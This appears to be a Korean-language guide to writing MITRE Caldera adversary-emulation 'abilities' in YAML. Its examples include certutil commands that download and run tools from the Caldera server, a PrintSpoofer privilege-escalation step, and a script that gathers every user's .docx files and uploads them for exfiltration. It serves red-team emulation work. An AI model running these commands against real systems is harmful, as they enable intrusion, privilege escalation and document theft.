# Caldera Ability Creation Guide

공식 문서 기반 Caldera ability 생성 가이드 (필수 사항 중심)

---

## 1. Ability 기본 구조

### 필수 필드

```yaml
- id: <UUID>                    # 랜덤 UUID
  name: <string>                # Ability 이름
  description: <string>         # 설명
  tactic: <string>              # MITRE ATT&CK tactic
  technique:
    attack_id: <string>         # MITRE ATT&CK ID (예: T1078)
    name: <string>              # MITRE ATT&CK technique 이름
  platforms:                    # 플랫폼별 executor
    <platform>:
      <executor>:
        command: <string>       # 실행할 명령어
```

### 선택 필드 (상황에 따라 사용)

```yaml
  platforms:
    <platform>:
      <executor>:
        payload: <filename>     # Caldera → Agent 파일 전송
        uploads: [...]          # Agent → Caldera 파일 전송
        cleanup: <string>       # 정리 명령어
        parsers: [...]          # 출력 파싱 모듈
        requirements: [...]     # 실행 전제조건
        timeout: <seconds>      # 타임아웃 (기본: 60)
```

### 최상위 선택 필드

```yaml
  delete_payload: <bool>        # payload 자동 삭제 여부 (기본: True)
  singleton: <bool>             # 한 번만 실행 (기본: False)
  repeatable: <bool>            # 반복 실행 가능 (기본: False)
```

**주의**: `singleton`과 `repeatable`은 동시에 True일 수 없음

---

## 2. Platform & Executor

### 지원 플랫폼

- `windows`: psh (PowerShell), cmd (Command Prompt)
- `linux`: sh (Bash/Shell)
- `darwin`: sh (macOS Shell)

### 플랫폼 지정 방법

```yaml
# 단일 플랫폼
platforms:
  windows:
    psh:
      command: Get-Process

# 여러 플랫폼 (동일 명령어)
platforms:
  darwin,linux:
    sh:
      command: ps aux
```

---

## 3. Command (명령어)

### 기본 사용법

```yaml
command: |
  단일 또는 여러 줄 명령어
  줄바꿈은 실행 시 제거됨
```

### 변수 사용 (Global Variables)

Caldera에서 자동으로 치환되는 변수들:

```yaml
#{server}           # Caldera 서버 주소
#{paw}              # Agent 고유 ID
#{location}         # Agent 파일시스템 경로
#{exe_name}         # Agent 실행파일 이름
#{group}            # Agent 소속 그룹
#{upstream_dest}    # Agent → 서버 연결 주소
#{origin_link_id}   # 내부 link ID
#{payload}          # Payload 파일 경로 (cleanup에서 주로 사용)
```

**예제**:
```yaml
command: |
  certutil -urlcache -split -f "#{server}/file/download" C:\temp\tool.exe
```

---

## 4. Payload (Caldera → Agent 파일 전송)

### 개념

- Caldera 서버 → Agent로 **파일 다운로드**
- Agent는 명령어 실행 전 자동으로 파일 다운로드
- 파일이 이미 존재하면 다운로드 생략

### 사용법

```yaml
platforms:
  windows:
    psh:
      command: |
        .\wifi.ps1 -Scan
      payload: wifi.ps1           # 단일 파일
```

**다중 파일**:
```yaml
platforms:
  windows:
    cmd:
      command: PrintSpoofer64.exe -i -c cmd
      payload: PrintSpoofer64.exe,vcruntime140.dll    # 쉼표로 구분
```

### Payload 저장 위치

- Stockpile plugin: `plugins/stockpile/payloads/`
- 기타 plugin payloads 디렉토리

---

## 5. Uploads (Agent → Caldera 파일 전송)

### 개념

- Agent → Caldera 서버로 **파일 업로드**
- 명령어 실행 후 자동으로 업로드
- Exfiltration에 주로 사용

### 사용법

```yaml
platforms:
  darwin,linux:
    sh:
      command: |
        echo "test" > /tmp/output.txt
      cleanup: |
        rm -f /tmp/output.txt
      uploads:
        - /tmp/output.txt         # 절대 경로
        - ./localfile.txt         # 상대 경로
```

### 실전 예제: 데이터 수집 후 압축 전송

```yaml
platforms:
  windows:
    psh:
      command: |
        $dir = "C:\Windows\Temp\exfil"
        New-Item -ItemType Directory -Force -Path $dir
        Copy-Item -Path "C:\Users\*\Documents\*.docx" -Destination $dir -ErrorAction SilentlyContinue
        Compress-Archive -Path $dir\* -DestinationPath "C:\Windows\Temp\data.zip"
      uploads:
        - C:\Windows\Temp\data.zip
      cleanup: |
        Remove-Item -Force -Recurse C:\Windows\Temp\exfil
        Remove-Item -Force C:\Windows\Temp\data.zip
```

---

## 6. Cleanup (정리)

### 개념

- 명령어 실행 후 시스템을 **원래 상태로 복원**
- Operation 종료 시 **역순**으로 실행
- Optional: Operation 시작 시 cleanup 스킵 가능

### 사용법

```yaml
platforms:
  windows:
    psh:
      command: |
        New-Item -Path C:\temp\testfile.txt
      cleanup: |
        Remove-Item -Force C:\temp\testfile.txt
```

**주의**: Payload 파일은 자동 삭제되므로 cleanup 불필요 (delete_payload: True가 기본값)

---

## 7. 완전한 예제

### 예제 1: Discovery (Native 명령어)

```yaml
- id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
  name: System Information Discovery
  description: Collect OS version and hostname
  tactic: discovery
  technique:
    attack_id: T1082
    name: System Information Discovery
  platforms:
    windows:
      cmd:
        command: systeminfo && hostname
        timeout: 60
```

### 예제 2: Privilege Escalation (Payload 사용)

```yaml
- id: b2c3d4e5-f6a7-8901-bcde-f12345678901
  name: PrintSpoofer Privilege Escalation
  description: Escalate privileges using PrintSpoofer
  tactic: privilege-escalation
  technique:
    attack_id: T1068
    name: Exploitation for Privilege Escalation
  platforms:
    windows:
      cmd:
        command: PrintSpoofer64.exe -i -c "powershell -ExecutionPolicy Bypass -File deploy.ps1"
        payload: PrintSpoofer64.exe,vcruntime140.dll,deploy.ps1
        timeout: 120
        cleanup: |
          del /f /q PrintSpoofer64.exe
          del /f /q vcruntime140.dll
          del /f /q deploy.ps1
```

### 예제 3: Exfiltration (Uploads 사용)

```yaml
- id: c3d4e5f6-a7b8-9012-cdef-123456789012
  name: Collect Corporate Data
  description: Gather documents and compress for exfiltration
  tactic: collection
  technique:
    attack_id: T1005
    name: Data from Local System
  platforms:
    windows:
      psh:
        command: |
          $stagingDir = "C:\Windows\Temp\exfil"
          New-Item -ItemType Directory -Force -Path $stagingDir
          Copy-Item -Path "C:\Users\*\Documents\*.docx" -Destination $stagingDir -ErrorAction SilentlyContinue
          Compress-Archive -Path $stagingDir\* -DestinationPath "C:\Windows\Temp\data.zip"
        uploads:
          - C:\Windows\Temp\data.zip
        timeout: 300
        cleanup: |
          Remove-Item -Force -Recurse C:\Windows\Temp\exfil
          Remove-Item -Force C:\Windows\Temp\data.zip
```

---

## 8. 도구 선택 우선순위

Ability 생성 시 다음 우선순위를 따름:

1. **제공된 Payload** (환경 설명에 명시된 파일)
   - 예: `cmd.asp`, `PrintSpoofer64.exe`, `deploy.ps1`

2. **Native OS 도구** (기본 내장 명령어)
   - Windows: `systeminfo`, `netstat`, `whoami`, `Compress-Archive`
   - Linux: `ps`, `netstat`, `tar`, `grep`

3. **Simulation/Stub** (실제 도구 없을 때)
   - 예: `echo "keylogger stub" > C:\Windows\Temp\perfcon.dat`
   - Description에 "(simulated)" 표시

---

## 9. 공통 패턴

### 패턴 1: Native OS 도구만 사용

```yaml
platforms:
  windows:
    cmd:
      command: netstat -ano && ipconfig /all
```

### 패턴 2: Caldera Payload 다운로드 + 실행

```yaml
platforms:
  windows:
    psh:
      command: |
        .\script.ps1 -Param "value"
      payload: script.ps1
      cleanup: |
        Remove-Item -Force script.ps1
```

### 패턴 3: 다단계 실행 (다운로드 → 실행 → 수집)

```yaml
platforms:
  windows:
    psh:
      command: |
        certutil -urlcache -split -f "#{server}/payloads/tool.exe" C:\temp\tool.exe
        C:\temp\tool.exe -param value
        Compress-Archive -Path C:\output\* -Destination C:\temp\results.zip
      uploads:
        - C:\temp\results.zip
      timeout: 300
      cleanup: |
        del /f /q C:\temp\tool.exe
        Remove-Item -Force C:\temp\results.zip
```

---

## 요약

- **필수**: id, name, description, tactic, technique, platforms
- **Payload**: Caldera → Agent 파일 전송 (실행 전)
- **Uploads**: Agent → Caldera 파일 전송 (실행 후)
- **Cleanup**: 시스템 원상복구 (역순 실행)
- **도구 우선순위**: 제공된 Payload > Native 도구 > Simulation
